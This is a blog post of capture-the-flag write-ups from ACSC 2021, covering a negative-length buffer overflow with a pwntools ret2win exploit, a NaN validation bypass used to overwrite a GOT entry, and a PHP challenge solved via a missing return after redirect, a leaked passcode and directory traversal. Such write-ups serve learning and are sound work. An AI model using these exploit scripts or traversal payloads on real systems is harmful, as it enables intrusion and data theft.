I played [Asian Cyber Security Challenge (ACSC)](https://acsc.asia/) last week, get 102th place!

![image1](/uploads/acsc2021/image1.png)

Here are some of my writeups

## Challenges
- [filtered](#filtered)
- [histogram](#histogram)
- [API](#API)

# filtered (pwn-100) {#filtered}

![image2](/uploads/acsc2021/image2.png)

## Challenge files
- [filtered](/uploads/acsc2021/filtered)
- [filtered.c](/uploads/acsc2021/filtered.c)

We get a ELF executable file `filtered` and its source code in C `filtered.c` 

Running `checksec` to check the binary security:
```bash
checksec filtered
[*] '/home/hong/hong5489.github.io/uploads/acsc2021/filtered'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

No canary means we are able to overflow the buffer easily, no PIE means no ASLR (address static)

Lets see the `main` function:
```c
/* Entry point! */
int main() {
  int length;
  char buf[0x100];

  /* Read and check length */
  length = readint("Size: ");
  if (length > 0x100) {
    print("Buffer overflow detected!\n");
    exit(1);
  }

  /* Read data */
  readline("Data: ", buf, length);
  print("Bye!\n");

  return 0;
}
```
We can see it get user input for buffer size and check if the length is > 0x100

But notice it **never check for negative value!** This may cause buffer overflow!

Saw a `win` function, that means we need to overflow it and call `win` function:
```c
/* Call this function! */
void win(void) {
  char *args[] = {"/bin/sh", NULL};
  execve(args[0], args, NULL);
  exit(0);
}
```

## Exploit
We can enter negative size and try overflow it:
```bash
python3 -c "print('-1\n'+'a'*0x200)" | ./filtered
Size: Data: Bye!
Segmentation fault
```
It overflowed!! Lets find the offset of the return pointer:
```bash
python3 -c "print('-1\n'+'a'*0x108)" | ./filtered
Size: Data: Bye!
python3 -c "print('-1\n'+'a'*0x116)" | ./filtered
Size: Data: Bye!
python3 -c "print('-1\n'+'a'*0x124)" | ./filtered
Size: Data: Bye!
Segmentation fault
```
We can see it overflow when we put 0x124 characters, so our offset is between 0x116 to 0x124

When I put 0x119 we can see it overflow the first byte of return pointer (61), can check it with `dmesg | grep filtered`:
```bash
dmesg | grep filtered
[ 8124.891776] filtered[2910]: segfault at 7fc3a0630061 ip 00007fc3a0630061 sp 00007ffd425a18a0 error 15 in libc-2.31.so[7fc3a0612000+25000]
```
Therefore the offset is `0x118`

Write a simple exploit using Pwntools:
```py
from pwn import *
elf = ELF("./filtered")
p = elf.process()
win = elf.symbols['win']
p.sendlineafter("Size: ",b'-1')
p.sendlineafter("Data: ",b'a'*0x118+p64(win))
p.interactive()
```
Can see it works!
```py
 python3 solve.py

    Arch:     amd64-64-little
    RELRO:    Partial RELRO

Bye!
$ ls
filtered  filtered.c  image1.png  image2.png  solve.py
$
```
Try it in the real server:
```py
from pwn import *
elf = ELF("./filtered")
# p = elf.process()
p = remote('filtered.chal.acsc.asia' ,9001)
win = elf.symbols['win']
p.sendlineafter("Size: ",b'-1')
p.sendlineafter("Data: ",b'a'*0x118+p64(win))
p.interactive()
```
It works like charm!!

# histogram (pwn-200) {#histogram}

![image3](/uploads/acsc2021/image3.png)

## Challenge files
- [histogram.ta.gz](/uploads/acsc2021/histogram.tar.gz_d48db29f562ee608ce5bd346221b9a2a.gz)

We get a ELF executable `histogram.bin` and the source code `histogram.c`

We need to submit a CSV file in a website:

![histogram](/uploads/acsc2021/histogram.png)

Same running `checksec` to check the binary security:
```bash
[*] '/home/hong/ctf/acsc/histogram/distfiles/histogram.bin'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
Partial RELRO and PIE is disable, means we probably need to overwrite [GOT address](https://en.wikipedia.org/wiki/Global_Offset_Table)

Lets see the main function:
```c
int main(int argc, char **argv) {
  if (argc < 2)
    fatal("No input file");

  /* Open CSV */
  FILE *fp = fopen(argv[1], "r");
  if (fp == NULL)
    fatal("Cannot open the file");

  /* Read data from the file */
  int n = 0;
  while (read_data(fp) == 0)
    if (++n > SHRT_MAX)
      fatal("Too many input");

  /* Show result */
  printf("{\"status\":\"success\",\"result\":{\"wsum\":");
  json_print_array(wsum, WSIZE);
  printf(",\"hsum\":");
  json_print_array(hsum, HSIZE);
  printf(",\"map\":[");
  for (short i = 0; i < WSIZE; i++) {
    json_print_array(map[i], HSIZE);
    if (i != WSIZE-1) putchar(',');
  }
  printf("]}}");

  fclose(fp);
  return 0;
}
```
As you can see, it take an argument from command line and read it as a file and pass into `read_data` function

Lets see the read_data function:
```c
int read_data(FILE *fp) {
  /* Read data */
  double weight, height;
  int n = fscanf(fp, "%lf,%lf", &weight, &height);
  if (n == -1)
    return 1; /* End of data */
  else if (n != 2)
    fatal("Invalid input");

  /* Validate input */
  if (weight < 1.0 || weight >= WEIGHT_MAX)
    fatal("Invalid weight");
  if (height < 1.0 || height >= HEIGHT_MAX)
    fatal("Invalid height");

  /* Store to map */
  short i, j;
  i = (short)ceil(weight / WEIGHT_STRIDE) - 1;
  j = (short)ceil(height / HEIGHT_STRIDE) - 1;
  
  map[i][j]++;
  wsum[i]++;
  hsum[j]++;

  return 0;
}
```
It read our input as two float values, like `1.0,1.0` then store it at `weight`, `height` variable
```c
double weight, height;
int n = fscanf(fp, "%lf,%lf", &weight, &height);
```

Then it validates our input see if too low or too high
```c
/* Validate input */
if (weight < 1.0 || weight >= WEIGHT_MAX)
	fatal("Invalid weight");
if (height < 1.0 || height >= HEIGHT_MAX)
	fatal("Invalid height");
```
After that it calculate the index based on the weight and height and add one to three arrays:
```c
/* Store to map */
short i, j;
i = (short)ceil(weight / WEIGHT_STRIDE) - 1;
j = (short)ceil(height / HEIGHT_STRIDE) - 1;

map[i][j]++;
wsum[i]++;
hsum[j]++;
```

It provide a `sample.csv` to let us run it:
```
./histogram.bin sample.csv

```

## Testing

Same as the previous challenge, this also have a `win` function:
```c
/* Call this function to get the flag! */
void win(void) {
  char flag[0x100];
  FILE *fp = fopen("flag.txt", "r");
  int n = fread(flag, 1, sizeof(flag), fp);
  printf("%s", flag);
  exit(0);
}
```
This means we have to **somehow bypass the validate check** in `read_data`, overwrite one GOT address to call `win` function

But how to bypass it? Maybe it has an edge case which can bypass the check, otherwise there is no way we can overwrite GOT address

I tested many case like minimum and maximum float value , inf, -inf just did not work..

But when I test `NaN` it bypass the check!

```bash
cat test.csv
NaN,10
./histogram.bin test.csv
{"status":"success","result":{"wsum":[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],"hsum":[1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],"map":[[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
...
...
```
NaN is (Not a number), when comparing NaN it just return False stated in [Wikipedia](https://en.wikipedia.org/wiki/NaN)

## Exploit

### Find the possible GOT address to overwrite

First we need to check where it overwrite first, set a breakpoint GDB before `map` is added

![image4](/uploads/acsc2021/image4.png)

You can see it overwrite the GOT of `fread` (0x404028)

```bash
pwndbg> x 0x404028
0x404028 <fread@got.plt>:       0x00401050
```

We can choose other good address to overwrite like `fclose`, because it call at the end of main function
```c
int main(int argc, char **argv) {
  ...
  ...
  printf("]}}");

  fclose(fp);
  return 0;
}
```
```bash
pwndbg> got

```
Can see `fclose` just below `fread`, let's try change our height from 10 to 20:
```
NaN,20
```
Run again it overwrite `0x40402c` which is 4 address above
```bash
 ► 0x401448 <read_data+346>    mov    dword ptr [rdx + rax], esi    <0x40402c>
```
Change to 30 and run it again, can see it overwrite the `fclose` GOT address!
```bash
 ► 0x401448 <read_data+346>    mov    dword ptr [rdx + rax], esi    <0x404030>
```

### How much to overwrite
You can see the `fclose` GOT value (PLT address) is `0x401060` and `win` locate at `0x401268` 

```bash
pwndbg> x 0x404030
0x404030 <fclose@got.plt>:      0x00401060
pwndbg> x win
0x401268 <win>: 0xfa1e0ff3
pwndbg> print 0x401268-0x401060
$2 = 520
```
Therefore, we just need to add `520` times to the `fclose` GOT address (0x401268-0x401060=520)

### Solving
Now we got all the things we need let's exploit it!

Wrote a simple python script using requests:
```py
import requests
url = "https://histogram.chal.acsc.asia/api/histogram"
r = requests.post(url, files={'csv': "nan,30\n"*520},verify=False)
print(r.text)
# {"status":"success","result":{"wsum":[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],"hsum":[0,0,520,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],"map":[[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,...,520]]}}ACSC{NaN_demo_iiyo}
```
And got the flag!! Most interesting pwn challenge I ever solve!

# API (web-220) {#API}

![image5](/uploads/acsc2021/image5.png)

## Challenge files
- [api.tar.gz](/uploads/acsc2021/api.tar.gz_e8eeed86d26a37a1b233b7e8b0e7f0ac.gz)

We are given an URL and the website source code

Goto the URL look like this:

![API](/uploads/acsc2021/api.png)

By viewing the source code, we know got 3 different page which is `signin.html`, `signup.html` and `admin.html`

admin.html is just one line of html
```html
<h1 style='text-align: center;'>Admin page is still under construction..</h1>
```
Tried to sign up but it says `Failed to join` let's investigate the source code

## Analyse
Inside `api.php` notice it get parameter of `id` and `pw` and pass to `main` function:
```php
<?php
require dirname(__FILE__).DIRECTORY_SEPARATOR."lib/config.php";
require dirname(__FILE__).DIRECTORY_SEPARATOR."lib/User.class.php";
require dirname(__FILE__).DIRECTORY_SEPARATOR."lib/Admin.class.php";
require dirname(__FILE__).DIRECTORY_SEPARATOR."lib/functions.php";

$id = $_REQUEST['id'];
$pw = $_REQUEST['pw'];
$acc = [$id, $pw];
main($acc);
```
The `main` function is at `functions.php`:
```php
function main($acc){
	gen_user_db($acc);
	gen_pass_db();
	header("Content-Type: application/json");
	$user = new User($acc);
	$cmd = $_REQUEST['c'];
	usleep(500000);
	switch($cmd){
		case 'i':
			if (!$user->signin())
				echo "Wrong Username or Password.\n\n";
			break;
		case 'u':
			if ($user->signup())
				echo "Register Success!\n\n";
			else
				echo "Failed to join\n\n";
			break;
		case 'o':
			if ($user->signout())
				echo "Logout Success!\n\n";
			else
				echo "Failed to sign out..\n\n";
			break;
	}
	challenge($user);
}
```
Here can see the `signup` function is at `user` class

```php
public function signup(){
	if (!preg_match("/^[A-Z][0-9a-z]{3,15}$/", $this->acc[0])) return false;
	if (!preg_match("/^[A-Z][0-9A-Za-z]{8,15}$/", $this->acc[1])) return false;
	$data = $this->load_db();
	for($i = 0; $i < count($data); $i++){
		if ($data[$i][0] == $this->acc[0]) return false;
	}
	file_put_contents($this->db['path'], $this->db['fmt'], FILE_APPEND);
	return true;
}
```
Here we can see when sign up, our username and password must match the regex statement

**For username:**
1. First character must be uppercase letter
2. After that number or lowercase letter at least 3 character

**For password:**
1. First character must be uppercase letter
2. After that number or alphabet at least 8 character

Then I tried registered with `Anonymous` for both and it success!

![image6](/uploads/acsc2021/image6.png)

But when I sign in it say only admin can access =(

![image7](/uploads/acsc2021/image7.png)

After that, I track the request using Burp Suite ([Best software for investigate request](https://portswigger.net/burp)):

![image8](/uploads/acsc2021/image8.png)

Can see it just redirect me to the same page

In `functions.php` inside `challenge` function, can see where it return access denied 
```php
function challenge($obj){
	if ($obj->is_login()) {
		$admin = new Admin();
		if (!$admin->is_admin()) $admin->redirect('/api.php?#access denied');
		$cmd = $_REQUEST['c2'];
		if ($cmd) {
			switch($cmd){
				case "gu":
					echo json_encode($admin->export_users());
					break;
				case "gd":
					echo json_encode($admin->export_db($_REQUEST['db']));
					break;
				case "gp":
					echo json_encode($admin->get_pass());
					break;
				case "cf":
					echo json_encode($admin->compare_flag($_REQUEST['flag']));
					break;
			}
		}
	}
}
```
But notice it did not put a return after the redirect:
```php
if (!$admin->is_admin()) $admin->redirect('/api.php?#access denied');
```
The code will continue to get `c2` parameter and switch statement:
```php
$cmd = $_REQUEST['c2'];
if ($cmd) {
	switch($cmd){
		case "gu":
			echo json_encode($admin->export_users());
			break;
		case "gd":
			echo json_encode($admin->export_db($_REQUEST['db']));
			break;
		case "gp":
			echo json_encode($admin->get_pass());
			break;
		case "cf":
			echo json_encode($admin->compare_flag($_REQUEST['flag']));
			break;
	}
}
```
That means **we are able the access the admin function** even we are not admin!

## Exploit

It's try to exploit it, add a `c2=gu` parameter. It success but it require passcode

![image9](/uploads/acsc2021/image9.png)

By viewing `Admin.class.php`, we can see it validates our `pas` parameter with `get_pass` function:
```php
public function is_pass_correct(){
	$passcode = $this->get_pass();
	$input = $_REQUEST['pas'];
	if ($input == $passcode) return true;
}
```
And most importantly, we are able to call `get_pass` by adding `c2=gp` according to the code:
```php
case "gp":
	echo json_encode($admin->get_pass());
	break;
```
Can see it return `:<vNk` in the response:

![image10](/uploads/acsc2021/image10.png)

After we add the `pas=:<vNk`, we are able to access other functions:

![image11](/uploads/acsc2021/image11.png)

## Solving
The `export_db` function seems suspicious:
```php
public function export_db($file){
	if ($this->is_pass_correct()) {
		$path = dirname(__FILE__).DIRECTORY_SEPARATOR;
		$path .= "db".DIRECTORY_SEPARATOR;
		$path .= $file;
		$data = file_get_contents($path);
		$data = explode(',', $data);
		$arr = [];
		for($i = 0; $i < count($data); $i++){
			$arr[] = explode('|', $data[$i]);
		}
		return $arr;
	}else 
		return "The passcode does not equal with your input.";
}
```
Notice it not validate our file input, which make this vulnerable to the [Directory Traversal Attack](https://en.wikipedia.org/wiki/Directory_traversal_attack)

Because it just append our input with the path like `path/input` 

Which means we can use many `../../../../` to get our flag locate at `/flag`

By change `c2=db` and adding `db=../../../../../../../../flag` we are able to the the flag!!

Easy and nice challenge!
